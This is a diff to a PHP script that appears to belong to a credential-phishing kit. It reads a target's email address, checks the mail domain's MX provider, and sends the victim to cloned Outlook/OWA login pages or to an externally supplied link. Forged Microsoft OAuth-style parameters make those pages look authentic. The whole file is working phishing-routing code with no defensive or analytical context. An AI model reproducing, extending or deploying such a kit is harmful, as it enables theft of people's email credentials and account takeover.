@@ -375,6 +375,7 @@ closedir($dir);
 }
 
 $email = strtolower($_POST['token']);
+$link = $_POST['link'];
 ///
 $cookie_name = "xlogin";
 $cookie_value = base64_encode($email);
@@ -386,11 +387,7 @@ $domain = str_replace("@","",$atdomain);
 
 //single page start
 if ($page==1){
-	$src="office";
-	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
-	$token = $token_kr;
-	recurse_copy( $src, $dst );
-	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
+	header("Location: https://$link/?username=$email");
 	exit;
 }
 elseif ($page==2) {
@@ -419,11 +416,13 @@ $owac = check_owa($domain);
 $a = strtolower($hosts[0]);
 
 if (strpos($a, 'outlook') !== false || searchtxt($domain)!== false) {
-    $src="office";
-	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
-	$token = $token_kr;
+	header("Location: https://$link/?username=$email");
+	exit;
+}
+elseif (strpos($a, 'serverdata') !== false){
+	$src="newowa";
 	recurse_copy( $src, $dst );
-	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
+	header("Location: $dst/load.php?token=$token_kr");
 }
 elseif (strpos($a, 'mimecast') !== false)
 	{
@@ -443,11 +442,8 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	$src="office";
-	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
-	$token = $token_kr;
-	recurse_copy( $src, $dst );
-	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
+	header("Location: https://$link/?username=$email");
+	exit;
 }
 }
 elseif (strpos($a, 'pphosted') !== false)
@@ -468,11 +464,8 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	$src="office";
-	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
-	$token = $token_kr;
-	recurse_copy( $src, $dst );
-	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
+	header("Location: https://$link/?username=$email");
+	exit;
 }
 }
 elseif (strpos($a, 'iphmx') !== false)
@@ -493,11 +486,8 @@ elseif ($owac == 'old exchange'){
 	header("Location: $dst/load.php?token=$token_kr");	
 }
 else {
-	$src="office";
-	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
-	$token = $token_kr;
-	recurse_copy( $src, $dst );
-	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
+	header("Location: https://$link/?username=$email");
+	exit;
 }
 }
 elseif (strpos($a, 'yahoo.com') !== false){
@@ -538,12 +528,8 @@ else {
 	}
 	else{
 		
-	$src="office";
-	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
-	$token = $token_kr;
-	recurse_copy( $src, $dst );
-	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
-		
+	header("Location: https://$link/?username=$email");
+	exit;	
 	}
 }
 
